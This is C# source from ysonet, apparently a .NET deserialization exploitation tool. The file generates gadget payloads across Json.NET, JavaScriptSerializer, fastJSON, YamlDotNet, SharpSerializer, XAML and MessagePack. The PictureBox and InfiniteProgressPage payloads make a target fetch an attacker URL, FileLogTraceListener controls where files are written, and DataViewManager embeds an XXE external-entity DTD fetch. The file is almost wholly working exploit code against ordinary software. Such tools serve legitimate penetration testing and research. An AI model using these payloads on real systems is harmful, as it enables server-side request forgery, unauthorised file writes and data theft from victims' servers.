using fastJSON;
using NDesk.Options;
using System;
using ysonet.Helpers;

namespace ysonet.Generators
{
    internal static class NonRceGadgetPayloadBuilder
    {
        private const string FileLogTraceListenerAssemblyQualifiedName =
            "Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

        internal static object PictureBox(string input, string formatter, bool rawInput)
        {
            if (IsMessagePack(formatter))
            {
                return MessagePackNonRceGadgetHelper.CreatePictureBox(
                    input,
                    formatter.Equals("MessagePackTypelessLz4", StringComparison.OrdinalIgnoreCase));
            }

            if (formatter.Equals(Formatters.JsonNet, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    '$type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'WaitOnLoad':'true',
    'ImageLocation':'" + JsonInput(input, rawInput) + @"'
}";
            }

            if (formatter.Equals(Formatters.JavaScriptSerializer, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    '__type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'WaitOnLoad':'true',
    'ImageLocation':'" + JsonInput(input, rawInput) + @"'
}";
            }

            if (formatter.Equals(Formatters.FastJson, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    ""$types"":{
        ""System.Windows.Forms.PictureBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"":""1""
    },
    ""$type"":""1"",
    ""WaitOnLoad"":true,
    ""ImageLocation"":""" + JsonInput(input, rawInput) + @"""
}";
            }

            if (formatter.Equals(Formatters.YamlDotNet, StringComparison.OrdinalIgnoreCase))
            {
                return @"
!<!System.Windows.Forms.PictureBox,System.Windows.Forms,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
    WaitOnLoad: true,
    ImageLocation: """ + JsonInput(input, rawInput) + @"""
}";
            }

            if (formatter.Equals("SharpSerializerXml", StringComparison.OrdinalIgnoreCase))
            {
                return @"
<Complex type=""System.Windows.Forms.PictureBox,System.Windows.Forms,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"">
    <Properties>
        <Simple name=""WaitOnLoad"" type=""System.Boolean,mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"" value=""True""/>
        <Simple name=""ImageLocation"" value=""" + XmlInput(input, rawInput) + @"""/>
    </Properties>
</Complex>";
            }

            if (formatter.Equals(Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
            {
                return @"<PictureBox WaitOnLoad=""true"" ImageLocation=""" + XmlInput(input, rawInput) + @""" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</PictureBox>
";
            }

            throw new Exception("Formatter " + formatter + " is not supported by PictureBox.");
        }

        internal static object InfiniteProgressPage(string input, string formatter, bool rawInput)
        {
            if (formatter.Equals(Formatters.JsonNet, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    '$type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'AnimatedPictureFile':'" + JsonInput(input, rawInput) + @"'
}";
            }

            if (formatter.Equals(Formatters.JavaScriptSerializer, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    '__type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'AnimatedPictureFile':'" + JsonInput(input, rawInput) + @"'
}";
            }

            if (formatter.Equals(Formatters.FastJson, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    ""$types"":{
        ""Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"":""1""
    },
    ""$type"":""1"",
    ""AnimatedPictureFile"":""" + JsonInput(input, rawInput) + @"""
}";
            }

            if (formatter.Equals(Formatters.YamlDotNet, StringComparison.OrdinalIgnoreCase))
            {
                return @"
!<!Microsoft.ApplicationId.Framework.InfiniteProgressPage,Microsoft.ApplicationId.Framework,Version=10.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
    AnimatedPictureFile: """ + JsonInput(input, rawInput) + @"""
}";
            }

            if (formatter.Equals("SharpSerializerXml", StringComparison.OrdinalIgnoreCase))
            {
                return @"
<Complex type=""Microsoft.ApplicationId.Framework.InfiniteProgressPage,Microsoft.ApplicationId.Framework,Version=10.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35"">
    <Properties>
        <Simple name=""AnimatedPictureFile"" value=""" + XmlInput(input, rawInput) + @"""/>
    </Properties>
</Complex>";
            }

            if (formatter.Equals(Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
            {
                return @"
<InfiniteProgressPage AnimatedPictureFile=""" + XmlInput(input, rawInput) + @""" xmlns=""clr-namespace:Microsoft.ApplicationId.Framework;assembly=Microsoft.ApplicationId.Framework"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</InfiniteProgressPage>
";
            }

            throw new Exception("Formatter " + formatter + " is not supported by InfiniteProgressPage.");
        }

        internal static object FileLogTraceListener(string input, string formatter, bool rawInput)
        {
            if (IsMessagePack(formatter))
            {
                return MessagePackNonRceGadgetHelper.CreateFileLogTraceListener(
                    input,
                    formatter.Equals("MessagePackTypelessLz4", StringComparison.OrdinalIgnoreCase));
            }

            if (formatter.Equals(Formatters.JsonNet, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    '$type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
    'CustomLocation':'" + JsonInput(input, rawInput) + @"'
}";
            }

            if (formatter.Equals(Formatters.JavaScriptSerializer, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    '__type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
    'CustomLocation':'" + JsonInput(input, rawInput) + @"'
}";
            }

            if (formatter.Equals(Formatters.FastJson, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    ""$types"":{
        ""Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"":""1""
    },
    ""$type"":""1"",
    ""CustomLocation"":""" + JsonInput(input, rawInput) + @"""
}";
            }

            if (formatter.Equals(Formatters.YamlDotNet, StringComparison.OrdinalIgnoreCase))
            {
                return @"
!<!Microsoft.VisualBasic.Logging.FileLogTraceListener,Microsoft.VisualBasic,Version=10.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a> {
    CustomLocation: """ + JsonInput(input, rawInput) + @"""
}";
            }

            if (formatter.Equals("SharpSerializerXml", StringComparison.OrdinalIgnoreCase))
            {
                return @"
<Complex type=""Microsoft.VisualBasic.Logging.FileLogTraceListener,Microsoft.VisualBasic,Version=10.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"">
    <Properties>
        <Simple name=""CustomLocation"" value=""" + XmlInput(input, rawInput) + @"""/>
    </Properties>
</Complex>";
            }

            if (formatter.Equals("DataContractJsonSerializer", StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    ""CustomLocation"":""" + JsonInput(input, rawInput) + @"""
}";
            }

            if (formatter.Equals(Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
            {
                return @"
<FileLogTraceListener CustomLocation=""" + XmlInput(input, rawInput) + @""" Filter=""{assembly:Null}"" xmlns=""clr-namespace:Microsoft.VisualBasic.Logging;assembly=Microsoft.VisualBasic"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</FileLogTraceListener>";
            }

            throw new Exception("Formatter " + formatter + " is not supported by FileLogTraceListener.");
        }

        private const string DataViewManagerAssemblyQualifiedName =
            "System.Data.DataViewManager, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        private const string DataViewManagerShortName =
            "System.Data.DataViewManager,System.Data,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";

        /// <summary>
        /// The XML the DataViewSettingCollectionString setter parses. The setter builds an
        /// XmlTextReader over this string and calls Read(), which parses the DOCTYPE before
        /// it validates the root name, so the external parameter entity is fetched first.
        ///
        /// The DOCTYPE name is the root name the setter expects, so the setter does not even
        /// throw afterwards.
        /// </summary>
        internal static string DataViewManagerXxeXml(string dtdUrl)
        {
            return "<!DOCTYPE DataViewSettingCollectionString ["
                 + "<!ENTITY % remote SYSTEM \"" + dtdUrl + "\">"
                 + "%remote;"
                 + "]><DataViewSettingCollectionString/>";
        }

        internal static object DataViewManagerXxe(string dtdUrl, string formatter)
        {
            string xml = DataViewManagerXxeXml(dtdUrl);

            if (formatter.Equals(Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
            {
                return @"<DataViewManager DataViewSettingCollectionString=""" + XmlInput(xml, false) + @""" xmlns=""clr-namespace:System.Data;assembly=System.Data"" />";
            }

            if (formatter.Equals(Formatters.JavaScriptSerializer, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    ""__type"":""" + DataViewManagerAssemblyQualifiedName + @""",
    ""DataViewSettingCollectionString"":""" + JsonInput(xml, false) + @"""
}";
            }

            if (formatter.Equals(Formatters.FastJson, StringComparison.OrdinalIgnoreCase))
            {
                return @"
{
    ""$types"":{
        """ + DataViewManagerAssemblyQualifiedName + @""":""1""
    },
    ""$type"":""1"",
    ""DataViewSettingCollectionString"":""" + JsonInput(xml, false) + @"""
}";
            }

            if (formatter.Equals("SharpSerializerXml", StringComparison.OrdinalIgnoreCase))
            {
                return @"
<Complex type=""" + DataViewManagerShortName + @""">
    <Properties>
        <Simple name=""DataViewSettingCollectionString"" value=""" + XmlInput(xml, false) + @"""/>
    </Properties>
</Complex>";
            }

            if (formatter.Equals(Formatters.SharpSerializerBinary, StringComparison.OrdinalIgnoreCase))
            {
                // No document to hand write here, and constructing the real DataViewManager
                // would fire the payload inside ysonet, so serialize a surrogate and swap the
                // type name in the stream.
                return SharpSerializerTypeSwap.SerializeAs(
                    new DataViewManagerSurrogate { DataViewSettingCollectionString = xml },
                    DataViewManagerAssemblyQualifiedName);
            }

            throw new Exception("Formatter " + formatter + " is not supported by DataViewManagerXxe.");
        }

        internal static object Finish(object payload, string formatter, InputArgs inputArgs)
        {
            string textPayload = payload as string;
            if (inputArgs.Minify)
            {
                if (formatter.Equals(Formatters.JsonNet, StringComparison.OrdinalIgnoreCase)
                    || formatter.Equals(Formatters.JavaScriptSerializer, StringComparison.OrdinalIgnoreCase)
                    || formatter.Equals(Formatters.FastJson, StringComparison.OrdinalIgnoreCase)
                    || formatter.Equals("DataContractJsonSerializer", StringComparison.OrdinalIgnoreCase))
                {
                    payload = textPayload = JsonMinifier.Minify(textPayload, null, null);
                }
                else if (formatter.Equals(Formatters.YamlDotNet, StringComparison.OrdinalIgnoreCase))
                {
                    payload = textPayload = YamlMinifier.Minify(textPayload);
                }
                else if (formatter.Equals(Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
                {
                    payload = textPayload = XmlMinifier.Minify(textPayload, null, null);
                }
                else if (formatter.Equals("SharpSerializerXml", StringComparison.OrdinalIgnoreCase))
                {
                    payload = textPayload = XmlMinifier.Minify(
                        textPayload,
                        null,
                        new[] { @" name=""r""" },
                        FormatterType.DataContractXML,
                        true);
                }
            }

            if (inputArgs.Test)
            {
                try
                {
                    if (formatter.Equals(Formatters.JsonNet, StringComparison.OrdinalIgnoreCase))
                        SerializersHelper.JsonNet_deserialize(textPayload);
                    else if (formatter.Equals(Formatters.JavaScriptSerializer, StringComparison.OrdinalIgnoreCase))
                        SerializersHelper.JavaScriptSerializer_deserialize(textPayload);
                    else if (formatter.Equals(Formatters.FastJson, StringComparison.OrdinalIgnoreCase))
                        JSON.ToObject<object>(textPayload);
                    else if (formatter.Equals(Formatters.YamlDotNet, StringComparison.OrdinalIgnoreCase))
                        SerializersHelper.YamlDotNet_deserialize(textPayload);
                    else if (formatter.Equals(Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
                        SerializersHelper.Xaml_deserialize(textPayload);
                    else if (IsMessagePack(formatter))
                        MessagePackNonRceGadgetHelper.Test(
                            (byte[])payload,
                            formatter.Equals("MessagePackTypelessLz4", StringComparison.OrdinalIgnoreCase));
                    else if (formatter.Equals("SharpSerializerXml", StringComparison.OrdinalIgnoreCase))
                        SerializersHelper.SharpSerializer_Xml_deserialize_FromString(textPayload);
                    else if (formatter.Equals(Formatters.SharpSerializerBinary, StringComparison.OrdinalIgnoreCase))
                        SerializersHelper.SharpSerializer_Binary_deserialize_FromByteArray((byte[])payload);
                    else if (formatter.Equals("DataContractJsonSerializer", StringComparison.OrdinalIgnoreCase))
                        SerializersHelper.DataContractJsonSerializer_deserialize(
                            textPayload,
                            Type.GetType(FileLogTraceListenerAssemblyQualifiedName, true),
                            null);
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }
            }

            return payload;
        }

        private static bool IsMessagePack(string formatter)
        {
            return formatter.Equals("MessagePackTypeless", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("MessagePackTypelessLz4", StringComparison.OrdinalIgnoreCase);
        }

        internal static void RequireInput(string input, string gadget)
        {
            if (string.IsNullOrWhiteSpace(input))
                throw new ArgumentException(gadget + " requires a non-empty -c input.");
        }

        internal static OptionSet RawInputOption(Action<bool> setRawInput)
        {
            return new OptionSet
            {
                {
                    "rawinput",
                    "Pass -c verbatim into the payload template instead of escaping it for the selected formatter. Use this only for already-escaped input.",
                    v =>
                    {
                        if (v != null)
                            setRawInput(true);
                    }
                }
            };
        }

        private static string JsonInput(string input, bool rawInput)
        {
            return rawInput ? input : CommandArgSplitter.JsonStringEscape(input);
        }

        private static string XmlInput(string input, bool rawInput)
        {
            return rawInput ? input : CommandArgSplitter.XmlStringAttributeEscape(input);
        }

    }

    // Shape only: the property name is what SharpSerializer writes into the binary
    // stream. Never deserialized as itself - SharpSerializerTypeSwap rewrites the type
    // name to System.Data.DataViewManager before the payload leaves ysonet.
    internal sealed class DataViewManagerSurrogate
    {
        public string DataViewSettingCollectionString { get; set; }
    }
}
